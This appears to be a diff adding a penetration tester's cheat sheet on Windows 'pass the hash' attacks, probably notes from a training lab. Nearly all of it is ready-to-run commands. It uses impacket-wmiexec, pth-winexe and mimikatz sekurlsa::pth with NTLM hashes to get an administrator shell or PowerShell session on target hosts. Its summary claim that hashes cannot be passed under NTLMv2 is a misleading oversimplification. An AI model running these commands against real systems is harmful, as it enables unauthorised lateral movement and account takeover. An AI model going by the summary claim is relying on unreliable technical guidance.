@@ -1,0 +1,35 @@
+[-]======================================[-]
+    pass the hash
+[-]======================================[-]
+
+
+
+- ---] Summary
+======================
+
+[+] You can only Pass the Hash on NTLM.
+[+] You CANNOT pass the hash on NTLM V2. 
+
+- ---] Quick Commands
+======================
+
+# wmiexec
+impacket-wmiexec xor.com/administrator@10.11.1.122 -hashes 'aad3b435b51404eeaad3b435b51404ee:fc9bc6a6f510b2a92388f67962a33b1c'
+
+# pth-winexe
+pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:fc9bc6a6f510b2a92388f67962a33b1c //10.11.1.120 cmd.exe --system
+
+# mimikatz - pth
+sekurlsa::pth /user:administrator /domain:. /ntlm:7ddade167a491d4f28eb25728469310e
+
+# mimikatz - opth
+sekurlsa::pth /user:administrator /domain:xor.com /ntlm:7c13687d23a3a88e57fc9ef8bb4cdf2f /run:powershell.exe
+
+
+- ---] Related Commands
+======================
+
+
+
+- ---] Misc Notes
+======================
